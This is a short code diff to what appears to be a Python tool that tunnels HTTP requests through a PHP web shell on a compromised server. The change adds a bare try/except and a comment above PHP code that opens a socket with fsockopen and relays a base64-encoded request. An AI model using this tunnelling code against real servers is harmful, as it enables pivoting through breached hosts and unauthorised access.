@@ -26,13 +26,16 @@ class ReqHandler(asyncore.dispatcher_with_send):
         self.sh_url = sh_url
 
     def handle_read(self):
-        data = self.recv(8192)
-        if data:
-            response = self.forward_request(data)
-            if response:
-                self.send(response)
-            else:
-                self.send(nf_404)
+        try:
+            data = self.recv(8192)
+            if data:
+                response = self.forward_request(data)
+                if response:
+                    self.send(response)
+                else:
+                    self.send(nf_404)
+        except:
+            pass
 
     def forward_request(self, data):
         if data:
@@ -56,6 +59,7 @@ class ReqHandler(asyncore.dispatcher_with_send):
                 b64_request = encodestring("{0}{1}".format(rb_request,
                                                            headers_str))
                 port = parsed_url.port if parsed_url.port else 80
+                #PHP code to run in the server
                 php_code = """$fp = fsockopen('{0}', {1}, $errno, $errstr, 5);
                               fwrite($fp, base64_decode('{2}'));
                               while (!feof($fp)) {{ echo fgets($fp, 2048); }};
